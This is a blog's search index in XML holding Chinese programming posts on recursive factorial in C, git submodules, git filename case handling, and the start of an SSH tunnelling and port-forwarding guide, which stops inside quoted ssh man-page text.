<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>递归函数之阶乘的实现</title>
      <link href="/2024/09/27/bian-cheng/di-gui-han-shu-zhi-jie-cheng-de-shi-xian/"/>
      <url>/2024/09/27/bian-cheng/di-gui-han-shu-zhi-jie-cheng-de-shi-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>在编程中函数有一个神奇又难理解的功能，就是递归。递归就是在一个过程中要调用上一步或上几步的结果，使用递归过程的函数就叫递归函数。简单说就是函数自身调用自身（听着有点反自然，像自己举起自己）。</p><h1 id="递归实例"><a href="#递归实例" class="headerlink" title="递归实例"></a>递归实例</h1><p>除了数学的复杂运算中，生活中也有不少递归的实例：</p><h2 id="德罗斯特效应"><a href="#德罗斯特效应" class="headerlink" title="德罗斯特效应"></a>德罗斯特效应</h2><p>德罗斯特效应（Droste effect）是递归的一种视觉形式，即一张图片中的某部分与整张图片相同，如下：<br><img src="https://i.loli.net/2018/04/15/5ad3565ad7935.jpg" alt="20180406205325252.jpg"></p><hr><p><img src="https://i.loli.net/2018/04/15/5ad3565b03bca.jpg" alt="20180406205355939.jpg"></p><hr><p><img src="https://i.loli.net/2018/04/15/5ad3565b0245f.jpg" alt="20180406205418499.jpg"></p><hr><blockquote><p>别晕、别晕 -_-</p></blockquote><p>或者在自己身前和身后都放一面镜子，深刻体会一会儿 ▄︻┻┳══━一</p><h1 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h1><p>接下来就用C语言递归函数来实现阶乘功能，源码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment">/*外部定义阶乘函数*/</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> m<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">/*注意要给函数设置一个递归结束条件*/</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>m <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>m <span class="token operator">=</span> n <span class="token operator">*</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*调用函数factorial()自身*/</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> m<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是程序大概的运算过程：<br><img src="https://i.loli.net/2018/04/15/5ad3565b00bba.jpg" alt="20180406220517224.jpg"></p><hr><blockquote><p><strong>这里要注意给函数设置一个递归结束条件，可以是 if 判断句，不然函数就无限调用自身下去了，你之前看着镜子中的镜子中的……自己都晕，程序自然是崩溃了</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 递归函数 阶乘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git submodule 知识总结</title>
      <link href="/2024/09/27/ruan-jian-gong-ju/git-submodule-zhi-shi-zong-jie/"/>
      <url>/2024/09/27/ruan-jian-gong-ju/git-submodule-zhi-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>先引用 <code>git</code> 的官方定义描述：</p><blockquote><p>A submodule is a repository embedded inside another repository. The submodule has its own history; the repository it is embedded in is called a superproject.</p></blockquote><p>子模块（<code>submodule</code>）是一个内嵌在其他 git 仓库（父工程）中的 git 仓库，子模块有自己的 git 记录。</p><p>通常，如果一个仓库存在子模块，父工程目录下的 <code>.git/modules/</code> 目录中会存在一个 <code>git</code> 目录，子模块的仓库目录会存在于父工程的仓库目录中，并且子模块的仓库目录中也会存在一个 <code>.git</code> 目录；</p><p>使用场景：</p><ul><li>想要在一个工程中使用另一个工程，但是那个工程包含了单独的提交记录，<code>submodule</code> 就可以实现在一个工程中引入另一个工程，同时保留二者的提交记录并且区分开来；目前 <code>submodule</code> 还能实现单独开发子工程，并且不会影响父工程，父工程可以在需要的时候更新子模块的版本；</li><li>想要把一个工程拆分成多个仓库并进行集中管理，这可以用来实现 <code>git</code> 当前的限制，实现更细粒度的访问，解决当仓库过于庞大时所出现的传输量大、提交记录冗杂、权限分设等问题；</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="新增子模块"><a href="#新增子模块" class="headerlink" title="新增子模块"></a>新增子模块</h3><p>向一个项目中添加子模块：</p><pre><code>git submodule add https://github.com/yyy/xxx.git</code></pre><p>之后会 <code>clone</code> 该子模块对应的远程项目文件到本地父项目目录下的同名文件夹中（<code>./xxx/</code>），父项目下也会多一个叫 <code>.gitmodules</code> 的文件，内容大致为：</p><pre class="line-numbers language-none"><code class="language-none">[submodule &quot;xxx&quot;]path &#x3D; xxxurl &#x3D; git@github.com:yyy&#x2F;xxx.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果存在多个子模块，则会继续向该文件中追加与上面相同格式的内容；</p><p>同时父项目下的 <code>.git</code> 目录中也会新增 <code>/modules/xxx/</code> 目录，里面的内容对应子模块仓库中原有的 <code>.git</code> 目录中的文件，此时虽然子模块目录下的 <code>.git</code> 依然存在，但是已经由一个文件夹变成了文件，内容为：</p><pre class="line-numbers language-none"><code class="language-none">gitdir: ..&#x2F;.git&#x2F;modules&#x2F;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即指向了父项目的 <code>.git/modules/xxx</code> 目录；如果运行 <code>git config --list</code> 查看项目的配置，也会发现多了类似下面两行的内容：</p><pre class="line-numbers language-none"><code class="language-none">submodule.xxx.url&#x3D;git@github.com:yyy&#x2F;xxx.gitsubmodule.xxx.active&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果修改 <code>submodule.xxx.url</code> 的值，则会覆盖 <code>.gitmodules</code> 文件中对应的 <code>url</code> 值；</p><h3 id="查看子模块"><a href="#查看子模块" class="headerlink" title="查看子模块"></a>查看子模块</h3><p>查看当前项目下的子模块：</p><blockquote><p><code>git submodule</code></p></blockquote><p> 或者</p><blockquote><p><code>git submodule status</code></p></blockquote><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">70c316ecb7c41a5bdf8a37ff93bf866d3b903388 xxx (heads&#x2F;master)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果将父项目推送到远程仓库（如 Github），在网页浏览该项目时子模块所在的目录会多一个类似 <strong><code>@70c316e</code></strong> 的后缀，即上面查看子模块命令输出内容的 hash 值的前面部分，点击这个目录会跳转到这个子模块对应的仓库地址（另一个 url）；</p><p>如果执行：</p><pre><code>git submodule deinit</code></pre><p>删除了子模块，则再次查看时输出会是这样的：</p><pre class="line-numbers language-none"><code class="language-none">-70c316ecb7c41a5bdf8a37ff93bf866d3b903388 xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="拉取子模块"><a href="#拉取子模块" class="headerlink" title="拉取子模块"></a>拉取子模块</h3><p>如果要 <code>clone</code> 一个项目，并且包含其子模块的文件，则需要给 <code>git clone</code> 命令最后加上 <code>--recurse-submodules</code> 或者 <code>--recursive</code> 参数（<strong>否则</strong>只会下载一个空的子模块文件）：</p><pre><code>git clone https://github.com/yyy/xxx.git --recursive</code></pre><p>当然，克隆时忘记了加这个参数，后续也有办法去拉取子模块的文件，首先执行：</p><pre><code>git submodule init</code></pre><p>这会初始化子模块相关配置，比如自动在 <code>config</code> 中加入下面两行内容：</p><pre class="line-numbers language-none"><code class="language-none">submodule.xxx.url&#x3D;git@github.com:yyy&#x2F;xxx.gitsubmodule.xxx.active&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后执行：</p><pre><code>git submodule update</code></pre><p>就可以拉取到子模块仓库中的文件了，也可以将这两步命令合并为一步：</p><pre><code>git submodule update --init</code></pre><p>要拉取所有层层嵌套的子模块，则执行：</p><pre><code>git submodule update --init --recursive</code></pre><p>之前 <code>clone</code> 时加参数不过是自动执行初始化配置并拉取子模块（甚至嵌套的子模块）中的文件罢了；</p><p>命令默认拉取<strong>主分支</strong>（<code>master</code>），想要修改这个默认拉取分支可以修改 <code>.gitmodules</code> 文件中子模块对应的 <code>branch</code> 值，或者执行：</p><pre><code>git config submodule.xxx.branch dev</code></pre><p>或者执行同时将配置写入文件，这样其他人拉取父项目也会获取该配置：</p><pre><code>git config -f .gitmodules submodule.xxx.branch dev</code></pre><h3 id="更新子模块"><a href="#更新子模块" class="headerlink" title="更新子模块"></a>更新子模块</h3><h4 id="拉取更新"><a href="#拉取更新" class="headerlink" title="拉取更新"></a>拉取更新</h4><p>获取子模块仓库的最新提交，同步远程分支的变更，可以直接在子模块目录下执行：</p><pre><code>git pull</code></pre><p>或者在父目录下执行：</p><pre><code>git submodule update --remote</code></pre><p>这里给 <code>git submodule update</code> 加上 <strong><code>--remote</code></strong> 是为了直接从子模块的当前分支的远程追踪分支获取最新变更，不加则是默认从父项目的 <code>SHA-1</code> 记录中获取变更；当有多个子模块时，该命令默认拉取<strong>所有</strong>子模块的变更，指定更新子模块 <code>xxx</code> 需要执行：</p><pre><code>git submodule update --remote xxx</code></pre><p>如果将修改子模块的相关变更推送到父项目的远程，其他人拉取代码时，只用 <code>git pull</code> 的话只会把子模块的相关修改拉取到父项目，具体变更并<strong>不会更新</strong>到子模块中，在父项目里执行：</p><blockquote><p><code>git diff --submodule</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">Submodule xxx a6e2962..70c316e (rewind):  &lt; add file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意子模块提交记录中前的 <strong><code>&lt;</code></strong> 符号，表示变更未更新到子模块文件夹里，所以更新子模块变更需要执行：</p><pre><code>git submodule update --init --recursive</code></pre><p>或者直接在父项目拉取时同时更新子模块（需要子模块已经 <code>init</code>，否则仍然拉取不到文件）：</p><pre><code>git pull --recurse-submodules</code></pre><h4 id="分支切换"><a href="#分支切换" class="headerlink" title="分支切换"></a>分支切换</h4><p>更新完子模块（<code>git submodule update</code>）后，虽然会将文件变更同步到子模块目录下，但是此时子模块并没有处于任何已有分支下，去子模块目录下检查一下分支就会发现：</p><blockquote><p><code>git branch -vv</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">* (HEAD detached at 16d1b6b) 16d1b6b mod file  master                     16d1b6b [origin&#x2F;master] mod file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当前分支并不是 <code>master</code>，而是一个 <code>detached</code> 状态的编号分支，官方文档称为“游离的 HEAD”，虽然可以提交，但是并没有本地分支跟踪这些更改，意味着下次更新子模块就会<strong>丢失</strong>这些更改；</p><p>所以在子模块下开始开发前，需要先<strong>切换</strong>到某个已有分支或者创建新的分支，比如进入主分支：</p><pre><code>git checkout master</code></pre><h4 id="分支合并"><a href="#分支合并" class="headerlink" title="分支合并"></a>分支合并</h4><p>除了默认的分支同步更新操作，也可以执行其他类型的分支更新行为，比如 <code>merge</code>，<code>rebase</code> 等；如将父项目中记录的子模块最新变更（分支是 <code>submodule.xxx.branch</code> 中配置的，默认主分支 <code>master</code>）<code>merge</code> 到子模块的当前分支中，则执行：</p><pre><code>git submodule update --remote --merge</code></pre><p><code>rebase</code> 到子模块当前分支则执行：</p><pre><code>git submodule update --remote --rebase</code></pre><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>如果其他人修改了子模块的内容并提交了记录，父项目也提交并推送了远程仓库，但是子模块<strong>没有</strong>推送其对应的远程仓库，<br>那么其他人拉取父项目代码变更时没有问题，但是<strong>更新</strong>子模块时就会遇到下面的问题：</p><pre class="line-numbers language-none"><code class="language-none">fatal: remote error: upload-pack: not our ref 16d1b6b94e3245f3a7fb4f43e5b6f44b14027fbbFetched in submodule path &#39;xxx&#39;, but it did not contain 16d1b6b94e3245f3a7fb4f43e5b6f44b14027fbb.Direct fetching of that commit failed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即由于其他人没有及时将子模块的提交 <code>push</code> 的子模块的远程仓库，我们本地父项目有了关于子模块最新的变更，但是在子模块的仓库中却找不到，就报错了，让对方在子模块下 <code>push</code> 一下这边再重新更新就行了；</p><p>为了避免制造这一不必要的麻烦，可以把在父项目中推送远程的命令替换为：</p><pre><code>git push --recurse-submodules=check</code></pre><p>这样如果子模块（与父项目记录的对应分支）存在未 <code>push</code> 的提交，就会报错，并且子模块有推送失败的，父项目也会推送失败；需要在推送父项目时自动推送未推送的子模块，则执行：</p><pre><code>git push --recurse-submodules=on-demand</code></pre><p>觉得每次手输太麻烦，就直接将其写入配置：</p><pre><code>git config push.recurseSubmodules check</code></pre><p>如果父项目中子模块的仓库地址（<code>submodule.xxx.url</code>）被其他协作者修改了，那么我们再更新子模块时就可能遇到问题，需要执行：</p><pre><code>git submodule sync --recursive</code></pre><p>同步完 <code>url</code>，然后再重新初始化更新：</p><pre><code>git submodule update --int --recursive</code></pre><h3 id="删除子模块"><a href="#删除子模块" class="headerlink" title="删除子模块"></a>删除子模块</h3><p>在确认移除子模块前，需要先将其取消注册（<code>unregister</code>），即删除该子模块相关的配置文件（<code>git config</code>），比如要移除子模块 <code>xxx</code>，则执行：</p><pre><code>git submodule deinit xxx</code></pre><p>然后子模块的相关配置会被删除（<code>.gitmodules</code> 和 <code>.git/modules/xxx</code> 中的配置会保留），子模块对应的目录也会被清空（子模块目录本身会保留），再运行 <code>git submodule status</code> 查看子模块则会输出：</p><pre class="line-numbers language-none"><code class="language-none">-70c316ecb7c41a5bdf8a37ff93bf866d3b903388 xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前缀 <strong><code>-</code></strong> 表示该子模块已经被取消注册，可理解为暂时移除，想必官方这样做也是给我们提供反悔的余地，因为想要<strong>恢复</strong>刚才删除的子模块，重新执行 <code>git submodule update --init xxx</code> 就能重新初始子模块并拉取文件；</p><p>由于还有一些配置文件仍然被保留，所以想要<strong>彻底删除</strong>的话，需要继续手动删除这里配置文件，即：</p><ul><li>删除子模块对应的目录 <code>xxx</code>；</li><li>删除 <code>.gitmoduls</code> 中子模块 <code>xxx</code> 对应的区块配置；</li><li>删除 <code>.git/modules/</code> 目录下的子模块目录 <code>xxx</code>；</li><li>删除子模块的缓存：<code>git rm --cached xxx</code>；</li></ul><p>然后再执行 <code>git submodule</code> 就没有任何输出了，清除完毕；</p><h3 id="子模块与父项目的联系"><a href="#子模块与父项目的联系" class="headerlink" title="子模块与父项目的联系"></a>子模块与父项目的联系</h3><p>父项目和子模块有着分开的 <code>git</code> 仓库，所以可以分别在父项目和子模块的目录下使用 <code>git</code> 命令，操作的也是<strong>各自</strong>的仓库，比如分别在父项目和子模块中执行 <code>git branch -a</code> 或者 <code>git remote -v</code> 的输出结果是不同的；</p><p>虽然二者有个分开的仓库与提交记录，但是又是关联起来的（这正是 <code>submodule</code> 所做的工作），举个例子，在子模块目录 <code>xxx/</code> 下新增一个文件 <code>test.txt</code>，然后在子模块目录中执行 <code>git satus</code> 会输出：</p><pre class="line-numbers language-none"><code class="language-none">Untracked files:  (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)        xxx&#x2F;test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时在父项目下执行 <code>git status</code> 输出的是：</p><pre class="line-numbers language-none"><code class="language-none">Changes not staged for commit:  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)  (commit or discard the untracked or modified content in submodules)        modified:   xxx (untracked content)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即提示需要先在子模块下提交修改记录；</p><p>然后子模块下提交记录，执行：</p><pre><code>git add .git commit -m &quot;add file&quot;</code></pre><p>这时再分别运行 <code>git status</code>，子模块的输出是：</p><pre class="line-numbers language-none"><code class="language-none">Your branch is ahead of &#39;origin&#x2F;master&#39; by 1 commit.  (use &quot;git push&quot; to publish your local commits)nothing to commit, working tree clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而父项目的输出是：</p><pre class="line-numbers language-none"><code class="language-none">Changes not staged for commit:  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        modified:   xxx (new commits)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>提示子模块中有了新的提交（<code>new commits</code>）；</p><p>假如再把子模块下的这个 <code>test.txt</code> 文件删除，则子模块的状态是：</p><pre class="line-numbers language-none"><code class="language-none">Changes not staged for commit:  (use &quot;git add&#x2F;rm &lt;file&gt;...&quot; to update what will be committed)  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        deleted:    xxx&#x2F;test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是父项目的状态依然是：</p><pre class="line-numbers language-none"><code class="language-none">Changes not staged for commit:  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        modified:   xxx (new commits)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>子模块撤销刚才的删除操作，将新增文件的记录 <code>git push</code> 到远程（这会推送到子模块<strong>自己</strong>的远程仓库），此时子模块的工作区状态是清空状态，但是父项目的依旧是：</p><pre class="line-numbers language-none"><code class="language-none">Changes not staged for commit:  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        modified:   xxx (new commits)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以，父项目与子模块的关联便是，父模块只是单纯的识别子模块的<strong>总体变化</strong>，而不会在意具体是新增、修改还是删除，甚至修改已经提交推送到子模块所属的远程仓库，只是将这些调整统一识别为 <code>modified</code> 状态，然后需要提交并推送到自己（父项目）所属的远程仓库；</p><p>在父项目中使用 <code>git diff</code> 可以查看当前的变更，会输出：</p><pre class="line-numbers language-none"><code class="language-none">diff --git a&#x2F;xxx b&#x2F;xxxindex 70c316e..a6e2962 160000--- a&#x2F;xxx+++ b&#x2F;xxx@@ -1 +1 @@-Subproject commit 70c316ecb7c41a5bdf8a37ff93bf866d3b903388+Subproject commit a6e29629904538e8f70694df607617084d2659ca<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要查看具体子模块的变动，可以执行：</p><blockquote><p><code>git diff --submodule</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">Submodule xxx 70c316e..a6e2962:  &gt; add file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出会列出当前子模块的所有变动的提交日志；也可以直接日志中关联的子模块提交记录，执行：</p><blockquote><p><code>git log -p --submodule</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">commit 909a721e3755affb7620316b44df8fbc1b3488f2 (HEAD -&gt; master)Author: ******Date:   ******    mod submoduleSubmodule xxx 70c316e..a6e2962:  &gt; add file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>父项目从含有子模块的分支切换到没有子模块的分支时，默认会<strong>保留</strong>子模块对应的目录，所以这使得切换过去时本地会保留关于子模块的修改记录，显然这不太合理，所以从包含子模块的分支切换到 <code>xxx</code> 时，需要这样执行：</p><pre><code>git checkout xxx --recurse-submodules</code></pre><p>当父项目存在许多子模块时，有时需要对多个子模块执行相同的操作，这时就可以使用 <strong><code>foreach</code></strong> 功能，比如批量存储：</p><pre><code>git submodule foreach &#39;git stash&#39;</code></pre><p>或者在每个子模块中新建切换分支：</p><pre><code>git submodule foreach &#39;git checkout -b new&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git submodule 子模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 仓库中文件名大小写问题</title>
      <link href="/2024/09/27/ruan-jian-gong-ju/git-cang-ku-zhong-wen-jian-ming-da-xiao-xie-wen-ti/"/>
      <url>/2024/09/27/ruan-jian-gong-ju/git-cang-ku-zhong-wen-jian-ming-da-xiao-xie-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>首先，Windows 下 git 默认配置是对文件/文件夹名称的大小写不敏感：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--get</span> core.ignorecase<span class="token comment"># true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这就导致了一些时候的难以预料问题的产生，针对这个配置，先引用一下官方帮助文档的原话：</p><blockquote><p>The default is <code>false</code>, except <code>git-clone</code> or <code>git-init</code> will probe and set core.ignoreCase <code>true</code> if appropriate when the repository is created.</p></blockquote><p>即 git 默认对大小写敏感，但是会在仓库克隆或初始化时，根据当前系统来设置是否忽略大小写，比如 Windows 下会设置为 <code>true</code>，即不敏感，而 Linux 中不会忽略；相信有不少开发者的项目开发与协同工作都是在 <strong>Windows</strong> 系统下进行的，下面就列出 git 的这种机制会导致的问题与解决思路；</p><h3 id="规范重命名"><a href="#规范重命名" class="headerlink" title="规范重命名"></a>规范重命名</h3><p>如果分支上直接在编辑器或资源管理器上修改项目中的文件名（只变更大小写），本地虽然可以调试通过，但是 git 并不会识别和记录这个修改，所以下一次提交推送时并不会带上这个重命名修改，远程仓库中这个文件名还是保持不变；</p><p>因此，如果检出其他分支或者其他协作者拉取代码，项目就会报错，因为一个本地文件的名称如果由小写变成了大写，使用这个文件的代码部分也改成了大写，推送到远程后，远程的这个文件依然是小写，但远程上使用该文件的代码却成功变成了大写，那边启动项目就多半会提示文件不存在了；</p><p>对于这种情况 git 提供了一种规范的做法，使用 <code>git mv</code> 命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> test.txt TEST.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以此来实现对文件的重命名，同时 git 也会将其识别为 <code>Rename</code> 的变更类型，然后正常提交推送就能同步到远程仓库了；如果是重命名文件夹，由于 Windows 下对文件夹的大小写也不敏感（-_-），所以直接使用上面的方法会失败：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> test-dir TEST-DIR<span class="token comment"># Rename from 'test-dir' to 'Test-dir/test-dir' failed.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里就只有迂回一下，先把文件夹命名成其他名称，然后再命名为大写就行了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> test-dir tmp<span class="token function">git</span> <span class="token function">mv</span> tmp TEST-DIR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>可以选择直接修改 git 配置为不忽略大小写：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config core.ignorecase <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接在资源管理器或编辑器中修改文件名大小写，git 就会识别到了，而且是被识别为 <code>untracked</code> 类型的变更，这依然是 Windows 下对文件名大小写不敏感导致的（=_=），如果直接推送到远程的话，那么远程仓库就会同时存在大小写<strong>两个版本</strong>的文件（github/gitlab 服务器通常都是 Linux 系统），为后期维护添加隐患，本地在分支间切换时也可能出现以下报错：</p><pre class="line-numbers language-none"><code class="language-none">error: The following untracked working tree files would be overwritten by checkout:        test.txtPlease move or remove them before you switch branches.Aborting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况下依然需要使用一些迂回的办法，就是先把要重命名的文件改成其他临时名称，提交一次（<code>git commit</code>），然后再把临时名称改成想要的名称，再提交一次，最后推送到远程，这样本地和远程都只保留下一个文件了；</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># rename test.txt --> tmp</span><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"..."</span><span class="token comment"># rename tmp --> TEST.TXT</span><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"..."</span><span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以不管是 Windows 还是其他系统下，还是不要轻易修改 git 默认的 <code>core.ignorecase</code> 配置，使用规范的 <code>git mv</code> 做法就好；</p>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git 大小写 ignorecase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH协议中隧道与代理的用法详解</title>
      <link href="/2024/09/27/ruan-jian-gong-ju/ssh-xie-yi-zhong-sui-dao-yu-dai-li-de-yong-fa-xiang-jie/"/>
      <url>/2024/09/27/ruan-jian-gong-ju/ssh-xie-yi-zhong-sui-dao-yu-dai-li-de-yong-fa-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>SSH 协议是 Linux 系统中使用较为频繁的协议之一，通常用于远程管理主机或服务器，默认使用 22 端口，可类比 Windows 系统中的 <code>telnet</code>（23 端口），这里要介绍的是 ssh 除了远程连接外的另一强大特性，即隧道加密与多种场景下代理功能的实现。</p><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>为了理解更轻松，最大程度上简化网络拓扑，后续都只用两台机器做测试，IP 与主机名对应关系如下；更复杂的网络结构和多接口场景可举一反三延申，要用作某些特殊用途，则自行<strong>YY</strong>。</p><pre class="line-numbers language-none"><code class="language-none">192.168.111.128  --&gt;  Kali192.168.111.131  --&gt;  Centos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在验证 IP 地址和多级代理的场景时，会额外用到网关机器：<code>192.168.111.1</code>。</p><p>然后再多了解一下三个 ssh 的命令行参数，后面会用到：</p><pre class="line-numbers language-none"><code class="language-none">-N    建立连接后不远程执行命令，也没有交互shell，通常用于端口转发的场景。-f    建立连接后会在后台运行进程，不占用前台窗口。-c    传输数据时对数据进行压缩，压缩算法和 gzip 的一样，但不适用于高速网络环境，会降低连接速度。-v    打印更详细的连接过程信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="本地转发（-L）"><a href="#本地转发（-L）" class="headerlink" title="本地转发（-L）"></a>本地转发（-L）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>本地转发即使用 <code>ssh -L</code> 参数，先看一下官方解释（<code>man ssh</code>）：</p><pre class="line-numbers language-none"><code class="language-none">-L [bind_address:]port:host:hostport-L [bind_address:]port:remote_socket-L local_socket:host:hostport-L local_socket:remote_socket        Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be        forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a        socket to listen to either a TCP port on the local side, optionally bound to the specified bind_address,        or to a Unix socket.  Whenever a connection is made to the local port or socket, the connection is for‐        warded over the secure channel, and a connection is made to either host port hostport, or the Unix        socket remote_socket, from the remote machine.        Port forwardings can also be specified in the configuration file.  Only the superuser can forward privi‐        leged ports.  IPv6 addresses can be specified by enclosing the address in square brackets.        By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit        bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost”        indicates that the listening port be bound for local use only, while an empty address or ‘*’ indicates        that the port should be available from all interfaces.<span aria-hidden="true" 